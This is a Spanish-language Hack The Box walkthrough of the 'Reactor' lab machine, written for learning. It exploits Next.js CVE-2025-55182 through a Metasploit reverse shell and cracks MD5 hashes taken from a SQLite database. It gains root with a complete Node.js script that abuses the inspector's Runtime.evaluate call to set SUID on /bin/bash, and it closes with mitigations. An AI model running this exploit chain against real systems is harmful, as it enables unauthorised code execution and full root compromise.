---
title: "HTB Walkthrough: Reactor"
date: 2026-10-04
draft: false
description: "Walkthrough completo de la máquina Reactor de Hack The Box. Dificultad Fácil, Linux. RCE sin autenticación en Next.js 15 (CVE-2025-55182) → base de datos SQLite con hashes MD5 → cracking con hashcat → SSH como engineer → escalada a root por Node.js Inspector WebSocket RCE (puerto 9229)."
tags: ["HackTheBox", "Linux", "Easy", "NextJS", "CVE-2025-55182", "RSC", "RCE", "SQLite", "MD5", "HashCracking", "NodejsInspector", "CDP", "WebSocket", "writeups"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Walkthrough de **Reactor** en Hack The Box. Máquina de dificultad **Fácil** con **Linux**. El puerto 3000 sirve una aplicación **Next.js 15.0.3** vulnerable a **CVE-2025-55182**: RCE sin autenticación a través de los React Server Components. Desde la shell como `node`, una base de datos SQLite expone hashes MD5 de usuarios; el hash de `engineer` se crackea con `hashcat` + `rockyou.txt` y da acceso SSH. Como `engineer`, `ps aux` revela que root ejecuta `node --inspect=127.0.0.1:9229` — el **Node.js Inspector** expone el protocolo CDP sin autenticación, permitiendo ejecutar JavaScript arbitrario como root vía `Runtime.evaluate`.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Linux{{< /badge >}}
{{< badge >}}Easy{{< /badge >}}

---

## 🗺️ Información de la Máquina

| Campo          | Detalle                                                                                                                                          |
|----------------|--------------------------------------------------------------------------------------------------------------------------------------------------|
| **Nombre**     | Reactor                                                                                                                                          |
| **SO**         | Linux (Ubuntu)                                                                                                                                   |
| **Dificultad** | Fácil                                                                                                                                            |
| **IP**         | 10.129.2.180                                                                                                                                     |
| **Técnicas**   | CVE-2025-55182 Next.js RSC RCE · SQLite MD5 hash cracking · Node.js Inspector WebSocket CDP · `Runtime.evaluate` como root                      |

---

## 1. Reconocimiento

### 1.1 Escaneo de Puertos

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.2.180
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp
```

### 1.2 Detección de Versión en Puerto 3000

```bash
nmap -sC -sV -p3000 10.129.2.180
```

```
PORT     STATE SERVICE VERSION
3000/tcp open  http    Next.js
| X-Powered-By: Next.js
| x-nextjs-cache: HIT
| Content-Type: text/html; charset=utf-8
```

> **💡 Superficie de ataque:** el puerto 3000 sirve una aplicación **Next.js**. La cabecera `X-Powered-By: Next.js` confirma el framework. Navegando a la página se puede confirmar visualmente la versión **15.0.3**, vulnerable a **CVE-2025-55182**.

---

## 2. Vulnerabilidad Identificada — CVE-2025-55182

Next.js 15.0.3 es vulnerable a **CVE-2025-55182**: RCE sin autenticación a través de los **React Server Components (RSC)**.

Next.js implementa los RSC con un endpoint especial que procesa peticiones RSC. En versiones vulnerables, este endpoint acepta payloads con código JavaScript serializado que se evalúa en el servidor sin ninguna validación ni comprobación de autenticación. Cualquier atacante con acceso de red puede enviar el payload y obtener ejecución de código en el contexto del proceso Node.js del servidor.

> **⚠️ Versión vulnerable:** Next.js **15.0.3** — CVE-2025-55182 permite RCE pre-autenticación a través del endpoint de React Server Components.

---

## 3. Explotación — CVE-2025-55182 vía Metasploit

```bash
msf6 > search Next.js
```

```
0  exploit/multi/http/react2shell_unauth_rce_cve_2025_55182  2025-12-03  excellent  Yes
   Unauthenticated RCE in React Server Components (React2Shell)
```

```bash
msf6 > use 0
msf6 exploit(...) > set RHOSTS 10.129.2.180
msf6 exploit(...) > set RPORT 3000
msf6 exploit(...) > set LHOST tun0
msf6 exploit(...) > run
```

```
[*] Started reverse TCP handler on 10.10.14.211:4444
[+] The target appears to be vulnerable.
[*] Command shell session 1 opened (10.10.14.211:4444 -> 10.129.2.180:42652)
```

```
Normal flow:    petición RSC legítima → Next.js renderiza componentes en servidor → HTML al cliente
Flujo malicioso: payload RSC con JS serializado → evaluado en servidor sin validación
                 → execSync con reverse shell → conexión saliente → shell como node
```

```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
```

---

## 4. User Flag — Enumeración Post-Explotación

### 4.1 Base de Datos SQLite con Credenciales

```bash
node@reactor:/opt/reactor-app$ ls
app  next.config.js  node_modules  package.json  package-lock.json  reactor.db
```

```bash
node@reactor:/opt/reactor-app$ sqlite3 reactor.db
```

```sql
sqlite> .tables
sensor_logs  users

sqlite> SELECT * FROM users;
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```

> **💡 Hallazgo clave:** dos hashes MD5 en texto claro dentro de un fichero SQLite accesible desde la aplicación. MD5 sin sal es extremadamente rápido de crackear con GPU.

### 4.2 Cracking de Hashes con Hashcat

```bash
hashcat -a 0 -m 0 a203b22191d744a4e70ada5c101b17b8 /usr/share/wordlists/rockyou.txt
# → No encontrado
```

```bash
hashcat -a 0 -m 0 39d97110eafe2a9a68639812cd271e8e /usr/share/wordlists/rockyou.txt
```

```
39d97110eafe2a9a68639812cd271e8e:reactor1

Status: Cracked
Time: < 1 segundo
```

> **🔑 Credenciales obtenidas:** `engineer : reactor1`

### 4.3 Acceso SSH

```bash
ssh engineer@10.129.2.180
# Password: reactor1
```

```bash
cat /home/engineer/user.txt
```

> 🔑 User flag obtenida.

---

## 5. Enumeración de Privilegios — Node.js Inspector

```bash
ps aux | grep node
```

```
root  1400  /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

> **⚠️ Exposición crítica:** el proceso `worker.js` corre como **root** con el flag `--inspect=127.0.0.1:9229`. Este flag activa el **Node.js Inspector** — una interfaz de depuración remota que permite ejecutar JavaScript arbitrario en el proceso a través de WebSockets, sin autenticación. Al estar limitado a `127.0.0.1`, solo es accesible localmente, pero como tenemos shell como `engineer` podemos conectarnos directamente.

```bash
curl -s http://127.0.0.1:9229/json
```

```json
[{
  "description": "node.js instance",
  "id": "3b81a7fd-0931-41d2-af32-1e64b26b05b9",
  "title": "/opt/uptime-monitor/worker.js",
  "type": "node",
  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/3b81a7fd-0931-41d2-af32-1e64b26b05b9"
}]
```

El endpoint `/json` devuelve el **WebSocket ID** del proceso — la URL a la que conectar el cliente CDP.

---

## 6. Escalada de Privilegios — WebSocket CDP → `Runtime.evaluate` como Root

El Node.js Inspector expone el **Chrome DevTools Protocol (CDP)**. El método `Runtime.evaluate` ejecuta cualquier expresión JavaScript en el contexto del proceso — aquí, un proceso root — sin ninguna autenticación.

### 6.1 Script de Explotación CDP por WebSocket

```javascript
// /tmp/pwn.js — Conecta al inspector Node.js vía WebSocket y ejecuta código como root
const net    = require('net');
const crypto = require('crypto');

const WS_ID = '3b81a7fd-0931-41d2-af32-1e64b26b05b9';

function maskedFrame(msg) {
    const payload = Buffer.from(msg, 'utf8');
    const mask    = crypto.randomBytes(4);
    const len     = payload.length;
    let header;
    if (len < 126) {
        header = Buffer.alloc(6);
        header[0] = 0x81;
        header[1] = 0x80 | len;
        mask.copy(header, 2);
    } else {
        header = Buffer.alloc(8);
        header[0] = 0x81;
        header[1] = 0x80 | 126;
        header.writeUInt16BE(len, 2);
        mask.copy(header, 4);
    }
    const masked = Buffer.alloc(payload.length);
    for (let i = 0; i < payload.length; i++) masked[i] = payload[i] ^ mask[i % 4];
    return Buffer.concat([header, masked]);
}

function parseFrame(buf) {
    const b1  = buf[1] & 0x7f;
    let offset = 2, len = b1;
    if (b1 === 126) { len = buf.readUInt16BE(2); offset = 4; }
    return buf.slice(offset, offset + len).toString();
}

const key    = crypto.randomBytes(16).toString('base64');
const socket = net.connect(9229, '127.0.0.1', () => {
    socket.write([
        `GET /${WS_ID} HTTP/1.1`,
        'Host: 127.0.0.1:9229',
        'Upgrade: websocket',
        'Connection: Upgrade',
        `Sec-WebSocket-Key: ${key}`,
        'Sec-WebSocket-Version: 13',
        '\r\n'
    ].join('\r\n'));
});

let upgraded = false;

socket.on('data', d => {
    if (!upgraded && d.toString().includes('101')) {
        upgraded = true;
        const msg = JSON.stringify({
            id: 2,
            method: 'Runtime.evaluate',
            params: {
                expression: `process.mainModule.require('child_process')
                             .execSync('chmod +s /bin/bash').toString()`,
                returnByValue: true
            }
        });
        socket.write(maskedFrame(msg));
        return;
    }
    if (upgraded) {
        try {
            const json = JSON.parse(parseFrame(d));
            if (json.id === 2) console.log('[+] Ejecutado como root.');
        } catch(e) {}
    }
});

setTimeout(() => process.exit(), 8000);
```

> **💡 Por qué funciona:** el flag `--inspect` expone el protocolo CDP sin autenticación. `Runtime.evaluate` ejecuta la expresión en el contexto del proceso root con todos sus privilegios. La máscara en los frames WebSocket es obligatoria en tráfico cliente → servidor (RFC 6455); sin ella el servidor cierra la conexión.

### 6.2 Ejecución

```bash
node /tmp/pwn.js
```

```
[+] Ejecutado como root.
```

```bash
ls -la /bin/bash
```

```
-rwsr-sr-x 1 root root 1396520 /bin/bash
```

```bash
/bin/bash -p
bash-5.1# whoami
root
```

```
Flujo normal:    --inspect enlazado a 127.0.0.1 → solo accesible localmente para depuración
Flujo malicioso: usuario local con shell → WebSocket CDP → Runtime.evaluate
                 → execSync como root → SUID en /bin/bash → /bin/bash -p → EUID 0
```

---

## 7. Root Flag

```bash
cat /root/root.txt
```

> 🏁 Root flag obtenida.

---

## 8. Resumen y Lecciones Aprendidas

**Cadena de compromiso:**

1. **Reconocimiento** → Nmap revela puertos 22 y 3000. Detección de versión confirma Next.js en el puerto 3000.
2. **CVE-2025-55182** → RCE pre-autenticación vía endpoint RSC de Next.js 15.0.3 → shell como `node` con Metasploit.
3. **SQLite** → `reactor.db` en `/opt/reactor-app/` expone hashes MD5 de usuarios. `hashcat -m 0` + `rockyou.txt` crackea el hash de `engineer` → contraseña `reactor1`.
4. **User flag** → `ssh engineer@10.129.2.180` → `/home/engineer/user.txt`.
5. **Node.js Inspector** → `ps aux` revela `root` ejecutando `node --inspect=127.0.0.1:9229 worker.js`. `curl :9229/json` devuelve el WebSocket ID del proceso.
6. **CDP RCE** → script WebSocket con `Runtime.evaluate` → `chmod +s /bin/bash` como root → `/bin/bash -p` → EUID 0.

**Qué aprendí de esta máquina:**

- **CVE-2025-55182 demuestra que los React Server Components son superficie de ataque si no se valida el input serializado.** El endpoint RSC de Next.js acepta payloads que se evalúan en servidor. Sin autenticación ni validación del origen del payload, cualquier petición arbitraria es RCE. La defensa exige parchear Next.js y nunca exponer aplicaciones RSC sin autenticación perimetral.

- **MD5 sin sal no es almacenamiento de contraseñas — es almacenamiento de contraseñas invertible.** Un hash MD5 de `reactor1` se crackea en menos de un segundo con cualquier GPU moderna y `rockyou.txt`. La función de coste de MD5 fue diseñada para velocidad, no para contraseñas. bcrypt, scrypt y Argon2 existen precisamente para este problema.

- **El Node.js Inspector con `--inspect` en producción es RCE para cualquier usuario local.** El flag activa un servidor WebSocket CDP sin autenticación. La documentación oficial de Node.js lo dice explícitamente: "The inspector is bound to a host and port. Anyone who can connect to that host:port has full debugger access." En producción no debe usarse `--inspect` nunca; si hace falta depuración remota, el canal correcto es un túnel SSH sobre un socket Unix.

- **Procesos root accesibles desde usuarios sin privilegios por `localhost` son una escalada de privilegios.** El aislamiento de `127.0.0.1` solo sirve si ningún usuario local puede conectarse — lo cual es falso en cualquier sistema multiusuario. El proceso debería ejecutarse como un usuario dedicado sin shell y sin acceso a recursos del sistema.

- **La separación entre el usuario de la aplicación y el sistema de ficheros es la primera línea de defensa.** La base de datos SQLite con hashes de credenciales estaba en el directorio de la aplicación, accesible por el usuario `node`. Permisos de fichero y separación de usuarios habrían detenido la escalada en ese punto.

**Mitigaciones:**

| Vector | Mitigación |
|--------|------------|
| CVE-2025-55182 — RCE pre-auth en Next.js 15.0.3 | Actualizar Next.js a una versión parcheada; nunca exponer aplicaciones RSC sin autenticación perimetral |
| Hashes MD5 sin sal en SQLite accesible desde la aplicación | Usar bcrypt, scrypt o Argon2 con sal aleatoria por usuario; restringir permisos de lectura sobre el fichero de base de datos |
| Contraseña débil (`reactor1`) en diccionario | Política de contraseñas complejas y únicas; auditar contra diccionarios filtrados al crear cuentas |
| `--inspect` en producción sin autenticación | Nunca usar `--inspect` en producción; para depuración remota, usar socket Unix + túnel SSH; restringir el puerto 9229 con firewall interno |
| Proceso root con inspector accesible por usuarios locales | Ejecutar servicios con cuenta dedicada sin shell; separar el proceso de producción del de depuración; aislar el acceso mediante namespaces o contenedores |
